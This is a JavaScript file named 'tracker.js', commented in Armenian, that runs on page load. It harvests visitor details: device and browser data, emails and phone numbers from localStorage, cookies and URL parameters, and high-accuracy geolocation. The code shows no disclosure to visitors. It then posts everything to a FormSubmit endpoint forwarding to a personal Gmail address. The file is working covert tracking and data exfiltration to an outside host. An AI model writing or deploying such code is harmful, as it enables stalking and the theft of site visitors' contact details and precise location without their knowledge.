// tracker.js - Վիզիտորի տվյալների հավաքում և ուղարկում FormSubmit-ի միջոցով
function trackVisitor() {
    const data = {
      website: window.location.href || "index.html",
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      screenWidth: window.screen.width,
      screenHeight: window.screen.height,
      language: navigator.language,
      referrer: document.referrer || "Direct visit",
      visitTime: new Date().toISOString(),
      ip: "Մոտքային IP-ն կավելացվի FormSubmit-ի կողմից",
      hasPhoneNumber: false,
      phoneNumber: null,
      location: null
    };
  
    // Ստուգել localStorage-ում պահված տվյալները
    try {
      const savedEmail = localStorage.getItem('userEmail');
      const savedPhone = localStorage.getItem('userPhone');
      
      if (savedEmail) data.savedEmail = savedEmail;
      if (savedPhone) {
        data.savedPhone = savedPhone;
        data.hasPhoneNumber = true;
        data.phoneNumber = savedPhone;
      }
    } catch (e) {
      console.log("LocalStorage access error:", e);
    }
  
    // Ստուգել cookies-ում պահված տվյալները
    try {
      const cookies = document.cookie.split(';').reduce((res, c) => {
        const [key, val] = c.trim().split('=').map(decodeURIComponent);
        return Object.assign(res, { [key]: val });
      }, {});
  
      if (cookies.email) data.cookieEmail = cookies.email;
      if (cookies.phone) {
        data.cookiePhone = cookies.phone;
        data.hasPhoneNumber = true;
        data.phoneNumber = cookies.phone;
      }
    } catch (e) {
      console.log("Cookie access error:", e);
    }
  
    // Ստուգել URL պարամետրերը հեռախոսահամարի համար
    try {
      const urlParams = new URLSearchParams(window.location.search);
      const phoneParam = urlParams.get('phone') || urlParams.get('tel') || urlParams.get('mobile');
      if (phoneParam) {
        data.urlPhone = phoneParam;
        data.hasPhoneNumber = true;
        data.phoneNumber = phoneParam;
      }
    } catch (e) {
      console.log("URL params error:", e);
    }
  
    // Փորձել ստանալ գեոտեղադրություն բոլոր պլատֆորմների համար
    function getLocation() {
      return new Promise((resolve) => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            position => {
              const locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                timestamp: new Date(position.timestamp).toISOString()
              };
              resolve(locationData);
            },
            error => {
              resolve({
                locationError: "Geolocation unavailable",
                errorCode: error.code,
                errorMessage: error.message
              });
            },
            {
              enableHighAccuracy: true,
              timeout: 10000,
              maximumAge: 0
            }
          );
        } else {
          resolve({
            locationError: "Geolocation not supported"
          });
        }
      });
    }
  
    // iOS-ի համար հատուկ ստուգում
    function checkIOS() {
      return /iPad|iPhone|iPod/.test(navigator.userAgent) || 
             (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
    }
  
    // Android-ի համար հատուկ ստուգում
    function checkAndroid() {
      return /Android/.test(navigator.userAgent);
    }
  
    // Լրացուցիչ տվյալներ պլատֆորմի մասին
    data.platformDetails = {
      isIOS: checkIOS(),
      isAndroid: checkAndroid(),
      isWindows: /Win/.test(navigator.platform),
      isLinux: /Linux/.test(navigator.platform) && !checkAndroid(),
      isMobile: /Mobi/.test(navigator.userAgent)
    };
  
    // Ստանալ տեղադրությունը և ուղարկել տվյալները
    getLocation().then(locationData => {
      data.location = locationData;
      sendData(data);
    });
}
  
// Տվյալների ուղարկում FormSubmit-ին
function sendData(data) {
    fetch("https://formsubmit.co/ajax/soghbatyanvahan@gmail.com", {
      method: "POST",
      headers: { 
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => console.log("Success:", data))
    .catch(error => console.error("Error:", error));
}
  
// Գործարկել հետևումը էջի բեռնվելուց հետո
window.addEventListener('load', trackVisitor);